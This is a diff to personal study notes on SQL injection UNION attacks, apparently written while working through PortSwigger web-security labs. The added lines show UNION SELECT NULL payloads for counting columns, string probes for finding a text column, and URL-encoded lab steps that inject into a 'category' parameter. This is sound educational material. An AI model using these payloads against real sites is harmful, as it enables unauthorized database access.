@@ -29,8 +29,20 @@
   +The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.
   +' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
-   ' UNION SELECT NULL,NULL,NULL-
--LAB: category='UNION+SELECT+BY+NULL,NULL,NULL-- => HTTP 200 REP => 3 COLUMN;
+   ' UNION SELECT NULL,NULL,NULL--
+-LAB: category='UNION+SELECT+NULL,NULL,NULL-- => HTTP 200 REP => 3 COLUMN;
 
 -Database-specific syntax
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+-Finding columns with a useful data type
+  +ex:' UNION SELECT 'a',NULL,NULL,NULL--
+  +ex:' UNION SELECT NULL,'a',NULL,NULL--
+  +ex:' UNION SELECT NULL,NULL,'a',NULL--
+  +ex:' UNION SELECT NULL,NULL,NULL,'a'--
+
+-Lab: SQL injection UNION attack, finding a column containing text
+STEP 1: category=%27UNION+SELECT+NULL,NULL,NULL--
+STEP 2:category=%27UNION+SELECT+NULL,%27brnCRr%27,NULL--
+STEP: HERE WE GOT HEHEHE.
 
